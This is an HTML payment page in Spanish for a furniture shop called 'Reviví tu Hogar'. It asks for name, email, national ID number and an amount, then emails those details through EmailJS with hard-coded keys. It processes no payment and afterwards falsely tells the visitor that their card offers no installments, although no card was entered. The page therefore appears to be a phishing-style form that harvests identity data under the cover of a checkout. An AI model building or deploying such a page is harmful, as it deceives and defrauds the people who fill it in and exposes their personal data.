<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Reviví tu Hogar - Pagos</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f2f2f2;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .form-container {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 500px;
    }
    h2 {
      text-align: center;
      color: #333;
    }
    input, select, button {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      background: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #45a049;
    }
    #mensajeExito {
      display: none;
      color: green;
      font-weight: bold;
      margin-top: 15px;
      text-align: center;
    }
    #cuotasSection {
      display: none;
    }
    #realizarPagoBtn {
      display: none;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>Reviví tu Hogar - Pago de Muebles</h2>
    <form id="formulario">
      <input type="text" name="nombre" placeholder="Nombre completo" required />
      <input type="email" name="email" placeholder="Correo electrónico" required />
      <input type="text" name="dni" placeholder="DNI" required />
      <input type="number" name="monto" placeholder="Monto a pagar" required />

      <button type="button" id="verCuotasBtn">Ver opciones de cuotas</button>

      <div id="cuotasSection">
        <label for="cuotas">Elegí la cantidad de cuotas:</label>
        <select name="cuotas" id="cuotas">
          <option value="3">3 cuotas</option>
          <option value="6">6 cuotas</option>
        </select>

        <button type="submit" id="realizarPagoBtn">Realizar pago</button>
      </div>
    </form>
    <div id="mensajeExito">Tu tarjeta no nos da opciones de cuotas por el momento</div>
  </div>

  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    emailjs.init('FL6vofHg7F9vLawQs'); // Tu public key

    const verCuotasBtn = document.getElementById("verCuotasBtn");
    const cuotasSection = document.getElementById("cuotasSection");
    const realizarPagoBtn = document.getElementById("realizarPagoBtn");
    const formulario = document.getElementById("formulario");
    const mensajeExito = document.getElementById("mensajeExito");

    verCuotasBtn.addEventListener("click", () => {
      cuotasSection.style.display = "block";
      verCuotasBtn.style.display = "none";
      realizarPagoBtn.style.display = "block";
    });

    formulario.addEventListener("submit", function (event) {
      event.preventDefault();

      const formData = new FormData(formulario);
      const templateParams = {
        nombre: formData.get("nombre"),
        email: formData.get("email"),
        dni: formData.get("dni"),
        monto: formData.get("monto"),
        cuotas: formData.get("cuotas")
      };

      emailjs.send('service_6pbv86h', 'template_m3nuw4p', templateParams)
        .then(function(response) {
          mensajeExito.style.display = "block";
          formulario.reset();
          cuotasSection.style.display = "none";
          verCuotasBtn.style.display = "block";
          realizarPagoBtn.style.display = "none";
        }, function(error) {
          alert("Error al enviar. Por favor reintente en unos minutos.");
        });
    });
  </script>
</body>
</html>
